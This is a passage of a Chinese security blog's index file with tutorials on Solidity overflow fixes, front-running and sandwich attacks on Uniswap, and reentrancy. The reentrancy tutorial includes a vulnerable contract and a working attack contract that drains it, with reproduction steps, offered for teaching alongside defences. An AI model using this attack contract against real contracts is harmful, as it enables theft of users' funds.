，即可成功攻击，为balanceOf[_to]增加大量代币。</p></blockquote></li></ul><h1 id="漏洞避免"><a href="#漏洞避免" class="headerlink" title="漏洞避免"></a>漏洞避免</h1><ul><li><p>该段代码安全的写法应该是这样的：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require (balanceOf[_from] &gt;&#x3D; _value );</span><br><span class="line">require (balanceOf[_from] &gt;&#x3D; burnPerTransaction);</span><br><span class="line">require (balanceOf[_from] &gt;&#x3D; _value + burnPerTransaction);</span><br></pre></td></tr></table></figure></li><li><p><strong>使用SafeMath</strong><br>  为了避免溢出和下溢的情况，OpenZeppelin 建立了一个叫做 SafeMath 的 库(library)，默认情况下可以防止这些问题。<br>  一个库 是 Solidity 中一种特殊的合约。其中一个有用的功能是给原始数据类型增加一些方法。<br/><br>  比如，使用 SafeMath 库的时候，我们将使用 using SafeMath for uint256 这样的语法。 SafeMath 库有四个方法 — add， sub， mul， 以及 div。现在我们可以这样来让 uint256 调用这些方法：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">uint256 a &#x3D; 5;</span><br><span class="line">uint256 b &#x3D; a.add(3); &#x2F;&#x2F; 5 + 3 &#x3D; 8</span><br><span class="line">uint256 c &#x3D; a.mul(2); &#x2F;&#x2F; 5 * 2 &#x3D; 10</span><br></pre></td></tr></table></figure><p>  我们注意到了一个不常见的语法<code>using···for···</code>这是因为SafeMath源码使用了library关键字，库允许我们使用 using 关键字，它可以自动把库的所有方法添加给一个数据类型。<br/><br>  我们来看一下SafeMath的源码：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    if (a &#x3D;&#x3D; 0) &#123;</span><br><span class="line">    return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 c &#x3D; a * b;</span><br><span class="line">    assert(c &#x2F; a &#x3D;&#x3D; b);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    &#x2F;&#x2F; assert(b &gt; 0); &#x2F;&#x2F; Solidity automatically throws when dividing by 0</span><br><span class="line">    uint256 c &#x3D; a &#x2F; b;</span><br><span class="line">    &#x2F;&#x2F; assert(a &#x3D;&#x3D; b * c + a % b); &#x2F;&#x2F; There is no case in which this doesn&#39;t hold</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    assert(b &lt;&#x3D; a);</span><br><span class="line">    return a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c &#x3D; a + b;</span><br><span class="line">    assert(c &gt;&#x3D; a);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  解释一下源码中的<code>assert</code></p><blockquote><p>assert 和 require 相似，若结果为否它就会抛出错误。 assert 和 require 区别在于，require 若失败则会返还给用户剩下的 gas， assert则不会。所以大部分情况下，你写代码的时候会比较喜欢 require，assert 只在代码可能出现严重错误的时候使用，比如 uint 溢出。</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReentryAttack</title>
      <link href="/Front-Running/"/>
      <url>/Front-Running/</url>
      
        <content type="html"><![CDATA[<h1 id="抢先交易攻击（Front-Running）"><a href="#抢先交易攻击（Front-Running）" class="headerlink" title="抢先交易攻击（Front-Running）"></a>抢先交易攻击（Front-Running）</h1><hr><blockquote><p>author：Thomas_Xu</p></blockquote><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>简单来说，Front-Running 是指在一笔正常交易等待打包的过程中，抢跑机器人通过设置更高 Gas 费用抢先完成攻击交易，以此攫取用户利益的攻击行为。而 Mempool（交易池） 是一组已经广播到网络中并等待被打包进区块的以太坊交易，它是 Front-Running 可以实施的前提，抢跑机器人通过不断扫描 Mempool 中的交易，来分析发现可攻击的目标。</p></blockquote><p><br /><br>在所有 Front-Running 中，最典型最具危害性的就是针对 AMM(自由做市商) 交易的 Sandwich Attacks （三明治攻击），除此以外还有针对套利、清算交易、闪电贷等利用系统漏洞获利的抢跑攻击，攻击者数量众多，且由自动化脚本控制，永远不知疲倦，因此任何有利可图的交易都会遭受他们的饱和攻击，几乎没有幸免的可能。<br/></p><ul><li><strong>Sandwich Attacks</strong><br>首先我们来看一个真实的三明治攻击案例：<br><img src="Uniswap3.png" alt=""><br>上图可见，三笔交易在同一个区块被打包，两笔攻击交易（打上了黑客标记的）中间夹着一笔正常交易。其具体流程如下：<blockquote><ol><li>用户首先发起一笔正常交易，用 237000.705USDC 买入 DG，设置 Gas Price 为 40.5Gwei；</li><li>抢跑机器人检测到这笔有利可图的交易后，随即展开攻击，发起一笔买入交易，设定 GasPrice 为 49.9Gwei，凭借 Gas 竞争机制成功抢跑用户的正常交易；</li><li>与此同时，机器人发出另一笔卖出交易，设置 GasPrice 同样为 40.5Gwei，因为时间顺序的原因，紧贴着用户正常交易完成。</li></ol></blockquote></li></ul><p>一次完美的抢跑攻击完成，算上手续费，机器人共赚取 16448.012-16310.3-15.2-10.61 = $111.9，而这种两笔攻击交易夹着一笔正常交易的攻击，就被形象的称为三明治攻击。</p><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><p>我们知道，现如今的主流 DEX 如 Uniswap 等，采用的都是 AMM （自动化做市商）机制，其价格遵循恒定乘积公式。例如，在 Uniswap 中建立一个 A 代币与 ETH 的流动池，A 数量为 1000，ETH 数量为 100，则两者数量乘积为 100000，当前 A 价格为 0.1ETH。当 Alice 试图用 10 个 ETH 来池子里购买 A 时，他所得到的 A 的数量 X，可以用下面的公式推导 (注：为简化计算，以下均未考虑手续费)：<br/><br><code>（1000-X）\*（100+10）= 100000，X = 90.9</code><br/><br>这笔交易中，A 的价格为 10/90.9 = 0.11，相比于原来 A 的价格，价格滑点为 :（0.11-0.1）/0.1*100% = 10%一笔交易就让币价产生了 10% 的滑点，可见越是流动性差的池子，遇到大额交易，越是容易产生滑点。而如果，能在用户正常的大额交易前（预计该交易会产生较大滑点），抢先买入 A，再在用户正常交易后，将刚买入的 A 卖出，就可以获得一笔不菲的收益。沿用刚才的例子，假设在 Alice 的交易前，Bob 抢先花 5 个 ETH 购买 A，然后在 Alice 的交易完成后，Bob 再把之前买入的 A 卖出，我们看看会有什么样的结果。<br/><br>首先是 Bob 的抢跑交易：<br/><br><code>(1000-X)\*(100+5) = 100000, X = 47.62</code><br/><br>即，Bob 用 5ETH 购得 47.62 个 A接下来是 Alice 的正常交易，注意此时流动池中 A 的数量变为 952.38，ETH 的数量变为 105：<br/><br><code>(952.38-X)\*(105+10) = 100000, X = 82.81</code><br/><br>最后 Bob 卖出 47.62 个 A 的交易，此时流动性中 A 的数量为 869.57，ETH 的数量为 115：<br/><br><code>(869.57+47.62）\*（115-Y）= 100000，Y = 5.97</code><br/><br>通过这一次抢跑攻击，Bob 净赚 5.97-5 = 0.97 个 ETH，而 Alice 净亏 90.9-82.81 = 8.09 个 A，Bob 通过使 Alice 蒙受更大的滑点损失来获得自己的收益！</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>作为一般用户，应对 Front-Running 可以有以下几种手段：</p><blockquote><ul><li>设置较低的交易滑点，比如 0.1%，这会让抢跑机器人缺少可盈利的空间。 缺点：滑点过低导致大额交易十分容易失败，且失败的交易仍然需要支付高昂手续费。</li><li>提高 gas 费用，这会增加机器人的攻击成本。缺点：这同样也增加了自己的交易成本。<br/></li></ul></blockquote><p>可以看出，以上解决方案都是无奈之举，且有各种不足，幸运的是，有很多团队认识到了 Front-Running 的危害性，并提出了不少有建设性的解决方案。首先通过对捕猎全过程的分析，我们可以得出结论，要实现 Front-Running，需要几个要素：</p><blockquote><ul><li>Transaction 公开性：可以在交易池中获取交易的详细信息以太坊交易执行机制：</li><li>可以通过 gas 竞争的方式抢先完成交易</li><li>AMM 交易曲线机制：恒定乘积机制可以造成较大滑点</li></ul></blockquote><p>反制手段就是分别在这几个要素上做文章。</p><ul><li><strong>避免Transaction公开性</strong><br/><br>  既然机器人是通过分析交易池中的交易来决定是否发起攻击，那么我们将交易信息直接加密，让机器人看不到或者看不懂不就好了？<br/><br>  社区中就有人提议使用零知识证明技术 zk-SNARKs 来达成上述目标，即运用 zk-SNARKs 将每笔交易的信息都加密隐藏起来，让机器人无从下手。<br/><br>  不过，目前该方案还不够成熟，存在需要消耗更高 Gas 费用和可能被利用来进行阻塞攻击，导致系统化整体 liveness 的缺陷。<br>  <br/></li><li><p><strong>更改以太坊交易执行机制</strong><br/><br>  当前的以太坊交易执行机制是通过 Gas 竞争来完成的，即谁出的 Gas 费高，矿工就优先打包谁的交易，那么我们如果绕过这种机制，把交易发给矿工让其直接打包，就杜绝了抢跑机器人在中途攻击的可能性<br/><br>  所以一种类似于 Layer 0 的方案也得到了一些应用，如星火矿池的 Taichi 服务，用户可以直接在 MetaMask 中设置 Taichi 的以太坊节点，这样交易就直接在没有出现在 Mempool 的情况下被打包了，但劣势是被打包的时效有一定的不确定性。<br/><br>  另外，如 ArcherSwap 类似理念的解决方案，构建了交易者和矿工之间的桥梁，交易者可以通过打赏的形式让矿工直接打包自己的交易，这就避免了被 Front-Running 的可能。虽然有那么点交保护费来避免被攻击的感觉，但也实实在在的降低了交易者的成本，而且有着不收取交易失败费用的优势。</p></li><li><p><strong>AMM 算法优化</strong><br>  在 AMM 机制下，大额交易产生过大的价格滑点（可理解为一个临时的错误价格），是 Front-Running 的利润空间，如果有一种 AMM 机制可以减少大额交易对后续交易价格的影响，就可以有效防止 Front-Running 攻击<br/><br>  早在 2018 年，Vitalik 在以太坊技术社区中提供了一个 方案，当发生兑换交易时，交易池价格不会立刻调整成真实价格，而是在若干分钟内，缓慢的趋向真实价格，这就好像交易池凭空多出了很多流动性一样，因此我们将这种技术称之为 Vitrual Balance （虚拟余额）技术。这种新机制，可大大压缩套利者的利润空间，有效防御 Front-Running 攻击，同时还可以增加流动性做市商的收益，可谓一举多得，1inch 的 mooniswap 就是这个方案的一个实现版本.</p></li><li><p><strong>增加流动性</strong><br>  此外，还有种思路，就是尽可能的加大交易池中特定价格区间的流动性，流动性越大，滑点越小，当流动性大到一定程度的时候，抢跑机器人就丧失了盈利空间，Uniswap 的 V3 版本的聚焦流动性特性，就是在这方面做出的努力。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主流DES——Uniswap简介</title>
      <link href="/Uniswap%E7%9A%84%E7%AE%80%E4%BB%8B/"/>
      <url>/Uniswap%E7%9A%84%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="主流-DEX—Uniswap介绍"><a href="#主流-DEX—Uniswap介绍" class="headerlink" title="主流 DEX—Uniswap介绍"></a>主流 DEX—Uniswap介绍</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>以太坊 1.0 的严重限制让简便的 Uniswap 脱颖而出，但以太坊 2.0 和 L2 链下系统将使更复杂的市场蓬勃发展。<br>“有个商业设想。开发一个AMM。不管谁来询价，我随时都能报出一个价格，我的定价算法会用 x * y = k。差不多就这些。想投资吗？”你会躲得远远的。<br/><br>其实，刚才描述的就是 Uniswap。Uniswap 也许是世界上最原始的链上做市商运作。莫名其妙的，它的交易量过去几个月出现爆发式增长，凭交易量已成为世界最大的去中心化交易所（DEX） 。</p><h2 id="展开"><a href="#展开" class="headerlink" title="展开"></a>展开</h2><blockquote><p>我们接下来的只会对niswap的做市机制进行解析，如果想要了解uniswap的底层源码逻辑，可以关注我之后的文章。</p></blockquote><p>Uniswap 是一个自动做市商，即 AMM。你可以把 AMM 设想成一个原始的、机器人式的做市商，它根据一个简单的定价算法，在两种资产之间随时提供报价。对 Uniswap 而言，它对这两种资产进行报价，其持有的每种资产的单位数相乘，总会等于一个常数。如果 Uniswap 拥有一些 x 代币，拥有一些 y 代币，它给每一笔交易定价，所以，它拥有的 x 的最终数量，和拥有的 y 的最终数量，两者相乘会等于一个常数 k。这就形成了一个常数积的等式：<code>x * y = k</code>。<br>这种对两种资产进行定价的方式，你可能会觉得非常怪异且过于独断。让两种代币的库存数相乘所得的积维持固定，为什么就能确保正确的报价呢？<br/><br>下面我们就通过一个简单的例子了解一下Uniswap</p><ul><li><p><strong>Uniswap 示例</strong><br>  假设我们在 Uniswap 的某个池里投入 50 个苹果 （a） 和 50 个香蕉 （b） ，任何人都可以用苹果换香蕉，或者用香蕉换苹果。假设一级市场中苹果与香蕉的汇率刚好是 1:1。因为该 Uniswap 资金池中分别有 50 个苹果和 50 个香蕉，因此，按上述常数积的等式规则，a <em> b = 2500 。对于任何交易，Uniswap 都需要保证，池中库存的苹果数和香蕉数相乘等于 2500。<br/><br>  假设一位客户进入我们的 Uniswap 池来买一个苹果。她应该支付多少个香蕉呢？如果她买走一个苹果，我们的池里就剩下 49 个苹果，而 49</em> b 依然需要等于 2500。这样香蕉的总数 b 就等于 51.02。由于之前池中有 50 个香蕉，因此我们还需要 1.02 个香蕉（在这个宇宙中我们允许碎片化香蕉的存在） ，因此，这位客户买一个苹果会得到的报价是：1.02 香蕉 / 苹果。</p><blockquote><p>请注意，这与两者之间 1:1 的原始价格很接近！因为这只是一笔小额交易，所以滑点较小。</p></blockquote><p>  <img src="Uniswap1.webp" alt=""></p><p>  如果她想买 10 个苹果， Uniswap 的报价会是 12.5 个香蕉，即这 10 个苹果每个的单价为 1.25 香蕉 / 苹果。如果她想要执行 25 个苹果这种大额交易，即要买库存苹果数量的一半，那么，单位价格会上涨到 2 香蕉 / 苹果！ </p><blockquote><p>可以看到当交易额变大，交易价格就会比原始价格成倍增长</p></blockquote></li><li><p><strong>抢先交易攻击（三明治攻击）的引申</strong><br>  在上面对Uniswap的介绍中其实我们可以发现一个好玩的地方。<br/><br>  如果苹果与香蕉之间的真实交易价格是 1:1，当第一位客户买走 10 个苹果后，我们 Uniswap 池就有会变成 40 个苹果和 62.5 个香蕉。如果有位<strong>套利者</strong>此时进入，她买走 12.5 个香蕉，让资金池恢复到最初状态，她只需付 10 个苹果，所以 Uniswap 对她的收费只有 0.8 苹果 / 香蕉。<br>  不难发现，Uniswap 会低价甩卖香蕉！就好像我们的算法此时意识到香蕉过多，所以它低价抛售香蕉，以吸引苹果流入，从而实现库存的再平衡。</p><blockquote><p>抢先交易攻击正是利用了这一特性，来赚取”差价”<br>  具体的抢先交易攻击我会放到下一章来讲</p></blockquote></li><li><p>套利损失（Impermanent Loss）简介</p><p>  下面你将了解 Uniswap 定价机制的工作方式。但这仍然引出一个问题——Uniswap 很好的完成了它工作吗？这东西真的会产生利润吗？毕竟，任何做市商都可以报价，但是否赚钱就不好说了。<br/><br>  答案是：取决于具体情况！具体来说，这取决于一种被称为<strong>套利损失</strong>的概念。它的运作方式如下：<br>  Uniswap 会对每笔交易收取少量费用 （目前为 0.3%） 。这是在名义价格之外的。因此，如果苹果和香蕉总是且永远以 1:1 价格进行交易，随着做市商在交易价格曲线上来回移动，这些费用将随时间累积。那么，与只持有 50 个苹果和 50 个香蕉的基线比较，Uniswap 池最终会积累更多的水果。<br/><br>  但是，如果苹果和香蕉之间的真实交易价格突然发生变化，会发生什么呢？假设某家香蕉农场遭遇了无人机攻击，出现大面积的香蕉短缺。香蕉现在像黄金一样贵。交易价格蹿升到 5 个苹果换 1 个香蕉。<br/><br>  Uniswap 上会发生什么？<br/><br>  套利者一秒都不会耽搁，立马杀入你的 Uniswap 池，抢购便宜的香蕉。他们调整交易规模，以便买走价格低于新汇率 5:1 的所有香蕉。这意味着他们需要移动价格曲线，直到满足以下等式：5x * x = 2500。<br/><br>  <img src="Uniswap2.webp" alt=""><br>  算一下这个数学题，你会得到如下结果：他们总共以 61.80 个苹果买到 27.64 个香蕉。平均交易价格为 2.2 个苹果：1 个香蕉，这远低于市场价，相当于得到 76.4 个免费苹果。</p><blockquote><p>这种现象称为「套利损失」。每当交易价格发生变动，就会出现套利者窃取廉价资产，直到资金池的定价达到正确为止。 </p></blockquote></li></ul><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>自 2018 年上线以来， Uniswap 已经席卷 DeFi 领域。考虑到 Uniswap 的原始版本只有大约 300 行代码，这一成绩尤其令人惊讶！ （AMM 本身拥有历史悠久的血统，但是常数函数做市商是一个相对较新的发明。） Uniswap 完全无需许可，任何人都可以注入资产。它甚至不需要预言机。回顾一下会发现它非常优雅，是可能发明的最简单的产品之一，它似乎从石头缝里诞生，并主导了 DeFi 领域。</p>]]></content>
      
      
      <categories>
          
          <category> Uniswap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Uniswap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReentryAttack</title>
      <link href="/ReentryAttack/"/>
      <url>/ReentryAttack/</url>
      
        <content type="html"><![CDATA[<h1 id="重入攻击分析"><a href="#重入攻击分析" class="headerlink" title="重入攻击分析"></a>重入攻击分析</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>在以太坊中，智能合约能够调用其他外部合约的代码，由于智能合约可以调用外部合约或者发送以太币，这些操作需要合约提交外部的调用，所以这些合约外部的调用就可以被攻击者利用造成攻击劫持，使得被攻击合约在任意位置重新执行(回调)，绕过原代码中的限制条件，从而发生重入攻击。重入攻击本质上与编程里的递归调用类似，所以当合约将以太币发送到未知地址时就可能会发生。</p><ul><li><strong>发生条件</strong><ol><li>调用了外部的合约且该合约是不安全的</li><li>外部合约的函数调用早于状态变量的修改</li></ol></li></ul><p>接下来给大家展示的是一个最简单的提款函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function withdraw()&#123;</span><br><span class="line">  require(msg.sender,call.value(balances[msg.sender])());</span><br><span class="line">  balances[msg.sender]&#x3D;0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这种函数大多存在于钱包、去中心化交易所中，目的是为了让用户提款，将合约中的代币转换成通用的以太币。<br/></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><pre><code>在进入分析之前，先介绍几个基础知识</code></pre><ul><li>以太坊常用的转账的方法<ol><li>transfer()：只会发送 2300 gas 进行调用，当发送失败时会通过 throw 来进行回滚操作，从而防止了重入攻击。</li><li>send()：只会发送 2300 gas 进行调用，当发送失败时会返回布尔值 false，从而防止了重入攻击。</li><li>gas().call.vale()()：在调用时会发送所有的 gas，当发送失败时会返回布尔值 false，不能有效的防止重入攻击。</li></ol></li><li><p>fallback函数<br>  回退函数 (fallback function)：回退函数是每个合约中有且仅有一个没有名字的函数，并且该函数无参数，无返回值，如下所示：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function() public payable&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  回退函数在以下几种情况中被执行：</p><ol><li>调用合约时没有匹配到任何一个函数</li><li>没有传数据</li><li>智能合约收到以太币（为了接受以太币，fallback 函数必被标记为 payable）</li></ol></li><li><p>漏洞<br>  通过我们对fallback函数的了解。<br>  如果我们构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）<br>  <img src="Reenter1.png" alt="攻击原理"><br>  我们先来看一段比较典型的有重入漏洞的合约：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract Reentrance&#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping (address &#x3D;&gt; uint256) balances;</span><br><span class="line"></span><br><span class="line">    function Reentrance()&#123;</span><br><span class="line">        _owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public payable&#123;</span><br><span class="line">        require(balances[msg.sender] &gt;&#x3D; amount);</span><br><span class="line">        require(this.balance &gt;&#x3D; amount);</span><br><span class="line">        &#x2F;&#x2F; 发送以太</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        &#x2F;&#x2F; 状态变量修改</span><br><span class="line">        balances[msg.sender] -&#x3D; amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable&#123;</span><br><span class="line">        balances[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address adre)constant returns(uint256)&#123;</span><br><span class="line">        return balances[adre];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet() constant returns(uint256 result)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  我们来看这个合约的 withdraw 函数，这个函数中的转账操作有一个外部调用（msg.sender.call.value(amount)()），所以我们就可以认为这个合约是可能有重入漏洞的，但是具体能否产生危害还需要更深入的分析：</p><ul><li>攻击者思路：<blockquote><ol><li>所有的外部调用都是不安全的且合约在接收以太的时候会触发 fallback 函数执行相应的逻辑，这是一种隐藏的外部调用，这种隐藏的外部调用是否会造成危害呢？</li><li>我们可以看到在 withdraw 函数中是先执行外部调用进行转账后才修改用户余额状态变量的，那我们可不可以在转账外部调用的时候构造一个恶意的逻辑合约在合约执行 balance[msg.sender] -= amount 之前一直循环调用 withdraw 函数一直提币从而将合约账户清空呢？</li></ol></blockquote></li><li>攻击合约：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line">import&quot;.&#x2F;Reentrance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ReentranceAttack&#123;</span><br><span class="line">    Reentrance re;</span><br><span class="line">    function ReentranceAttack(address _target) public payable&#123;</span><br><span class="line">        re &#x3D; Reentrance(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet()view returns(uint256)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit()public payable &#123;</span><br><span class="line">        re.deposit.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()&#123;</span><br><span class="line">        re.withdraw(1);</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        if (address(re).balance &gt;&#x3D; 1 ether)&#123;</span><br><span class="line">            re.withdraw(1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>攻击原理：<br>  由于受害者合约withdraw函数使用call函数转账，会附加”所有可用gas”，并触发msg.sender的fallback函数。fallback 函数再次调用withdraw函数套利，由于withdraw函数最后一步才减去msg.sender对应的余额并记录导致递归调用withdraw函数require判断都能通过。直到合约中没有可用余额为止。<br>  类似于对攻击者fallback函数的递归调用<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2>首先用账户(<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>)模拟受害者，点击depoly开始部署。<br><img src="Reenter2.png" alt=""><br>然后将Value改为5，单位改为ether。点击deposit方法<br><img src="Reenter3.png" alt=""><br>查看当前账户余额为5ether，存款成功<br><img src="Reenter4.png" alt=""><br>创建一个新账户（<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>）来模拟攻击者，在Deploy处填写漏洞合约地址，部署攻击合约。<br><img src="Reenter5.png" alt=""><br>部署成功后，先查看攻击合约的wallet为0<br><img src="Reenter6.png" alt=""><br>攻击者先存款 1 ether 到漏洞合约中，这里设置 VALUE 为 1 ether，之后点击攻击合约的 deposit 进行存款。<br><img src="Reenter7.png" alt=""><br>再次调用漏洞合约的wallet方法，却发现有了6 ether<br><img src="Reenter8.png" alt=""><br>攻击者 (<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>) 调用攻击合约的 attack 函数模拟攻击，之后调用被攻击合约的 wallet 函数去查看合约的余额，发现已经归零，此时回到攻击合约查看余额，发现被攻击合约中的 6 ether 已经全部提款到了攻击者合约中，这就造成了重入攻击。<br><img src="Reenter9.png" alt=""></li></ul></li></ul><h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><ul><li><p><strong>加入防重入锁</strong><br>  下面是一个防重入锁的例子：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.3;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyGuard &#123;</span><br><span class="line">    bool internal locked;</span><br><span class="line"></span><br><span class="line">    modifier noReentrant() &#123;</span><br><span class="line">        require(!locked, &quot;No re-entrancy&quot;);</span><br><span class="line">        locked &#x3D; true;</span><br><span class="line">        _; </span><br><span class="line">    locked &#x3D; false; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>写代码时需要遵循先判断，后写入变量在进行外部调用的编码规范（Checks-Effects-Interactions）</strong></p></li><li><p><strong>使用send() 和 transfer() 转币，只会传递2300Gas供调用，防止重入攻击。</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
